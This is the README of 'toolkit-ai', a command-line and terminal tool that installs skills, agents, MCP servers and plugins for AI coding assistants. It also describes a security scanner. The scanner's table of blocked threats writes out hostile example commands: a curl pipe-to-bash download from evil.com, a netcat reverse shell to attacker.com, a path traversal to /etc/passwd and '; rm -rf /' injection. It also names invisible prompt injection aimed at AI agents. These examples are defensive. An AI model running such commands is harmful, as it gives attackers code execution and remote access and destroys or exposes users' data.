<div align="center">

```
████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗██╗████████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██║ ██╔╝██║╚══██╔══╝
   ██║   ██║   ██║██║   ██║██║     █████╔╝ ██║   ██║
   ██║   ██║   ██║██║   ██║██║     ██╔═██╗ ██║   ██║
   ██║   ╚██████╔╝╚██████╔╝███████╗██║  ██╗██║   ██║
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝
```

**toolkit-ai**

**Manage AI skills, agents, MCPs, and plugins across Claude Code, Copilot, and Cursor.**

[![npm version](https://img.shields.io/npm/v/toolkit-ai.svg)](https://www.npmjs.com/package/toolkit-ai)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

</div>

---

## Install

```bash
npx toolkit-ai            # run directly, no install
npm install -g toolkit-ai  # or install globally
```

## What It Does

A CLI with an interactive TUI that lets you browse, install, and manage AI development resources from internal and external sources — all in one place.

| Resource | What it is | Installs to |
|----------|-----------|-------------|
| **Skills** | Markdown instructions that teach AI agents new capabilities | `~/.claude/skills/` `~/.copilot/skills/` |
| **Agents** | Specialized agent definitions with tool access | `~/.claude/agents/` `~/.copilot/agents/` |
| **MCPs** | Model Context Protocol server connections | `settings.json` / `mcp.json` |
| **Plugins** | Bundles that group skills + agents + MCPs together | All of the above |

## TUI

Run `ai-toolkit` with no arguments to launch the interactive interface:

```
ai-toolkit
```

| Tab | What you do |
|-----|-------------|
| **Browse** | Search and install from all sources |
| **Plugins** | One-click install of curated bundles |
| **Installed** | Manage and remove installed items |
| **Sources** | Add/remove external GitHub or Bitbucket repos |
| **Updates** | View and apply available updates |

**Keyboard:** `Tab` switch tabs · `↑↓` navigate · `Space` select · `Enter` details · `/` search · `q` quit

## CLI

```bash
ai-toolkit --list                     # List all available items
ai-toolkit --skill <name>             # Install a skill
ai-toolkit --agent <name>             # Install an agent
ai-toolkit --mcp <name>               # Register an MCP server
ai-toolkit --plugin <name>            # Install a plugin bundle
ai-toolkit remove --skill <name>      # Remove a skill
ai-toolkit check                      # Check for updates
ai-toolkit update                     # Update all installed items
ai-toolkit scan                       # Security scan all items
ai-toolkit init [dir]                 # Scaffold a new skill repo
ai-toolkit source add <repo>          # Add an external source
ai-toolkit source list                # List configured sources
ai-toolkit source remove <name>       # Remove a source
```

## Security Scanner

Every item is automatically scanned before installation. The scanner catches genuinely dangerous content while allowing legitimate skills to install cleanly.

### What gets blocked

| Threat | Example | Why it's dangerous |
|--------|---------|-------------------|
| **Remote code execution** | `curl https://evil.com/x.sh \| bash` | Downloads and runs arbitrary code on your machine |
| **Reverse shells** | `nc -e /bin/sh attacker.com 4444` | Opens a remote backdoor to your system |
| **Encoded PowerShell** | `powershell -enc SGVsbG8=` | Hides malicious commands in base64 encoding |
| **Invisible prompt injection** | Zero-width unicode characters | Hides instructions that humans can't see but AI agents execute |
| **Bidi text manipulation** | RTL/LTR override characters | Makes code appear different than what actually runs |
| **Path traversal** | `../../../etc/passwd` in file paths | Escapes the skill directory to read/write system files |
| **Symlink escape** | Symlink pointing to `~/.ssh/` | Tricks the installer into copying sensitive files |
| **Malicious MCP URLs** | `file:///etc/passwd`, `http://10.0.0.1` | Accesses local files or internal network services |
| **MCP command injection** | URL containing `; rm -rf /` | Injects shell commands through MCP server URLs |

### What passes cleanly

Skills that reference `<script>` tags, use `exec()`, contain `.html` templates, import `child_process`, or include any normal code patterns are **not flagged**. The scanner only catches content that has no legitimate use in a skill.

### Trust model

| Source | Behavior |
|--------|----------|
| **Bundled** (ships with toolkit) | Warnings only — you control this content |
| **External** (GitHub/Bitbucket repos) | Full blocking — untrusted by default |

Use `--force` to override a blocked install if you've reviewed the content.

## External Sources

Add any GitHub or Bitbucket repo as a skill source:

```bash
# Via TUI: Sources tab, press 'a'
# Via CLI:
ai-toolkit source add owner/repo
ai-toolkit source add https://github.com/owner/repo
ai-toolkit source add https://bitbucket.org/owner/repo
ai-toolkit source add git@github.com:owner/repo.git
ai-toolkit source list
ai-toolkit source remove <name>
```

External repos are **shallow-cloned** (`--depth 1`) and cached locally. The cache refreshes automatically every 24 hours, or on demand from the TUI.

## How Storage Works

```
~/.toolkit/
  lock.json              # Tracks what's installed, content hashes, timestamps
  sources.json           # Your configured external sources (overrides defaults)
  cache/                 # Shallow-cloned repos from external sources
    vercel-labs/         #   └─ cached clone of vercel-labs/agent-skills
    anthropics/          #   └─ cached clone of anthropics/skills
```

**Installed items** are copied (not linked) to the target tool's config directory:

```
~/.claude/
  skills/brainstorming/SKILL.md       # Installed skill
  agents/code-reviewer.agent.md       # Installed agent
  settings.json                       # MCP servers registered here

~/.copilot/
  skills/brainstorming/SKILL.md       # Same skill, mirrored
  agents/code-reviewer.agent.md

~/.cursor/mcp.json                    # MCP servers registered here
~/.vscode/mcp.json                    # MCP servers registered here
```

The **lock file** (`lock.json`) tracks every installed item with a content hash so the toolkit can detect updates — if a skill changes upstream, `ai-toolkit check` will flag it.

## Create Your Own Skills

Scaffold a boilerplate repo to publish your own skills:

```bash
ai-toolkit init my-skills
```

This creates:

```
my-skills/
  resources/
    skills/example-skill/SKILL.md
    agents/example-agent.agent.md
    mcps/example-mcp.json
    plugins/example-plugin.json
  README.md
  .gitignore
```

Push to GitHub, then share with your team:

```bash
ai-toolkit source add your-org/my-skills
```

## Development

```bash
git clone https://github.com/barleviatias/toolkit-ai.git
cd toolkit-ai
npm install
npm run build    # Build -> bin/ai-toolkit.mjs
npm run dev      # Build with watch
npm test         # Lint skills + validate catalog
npm link         # Link globally for testing
```

## Tech Stack

- **React Ink** — terminal UI framework
- **tsup** — bundles into a single zero-dependency executable
- **TypeScript** — full type safety

## License

MIT
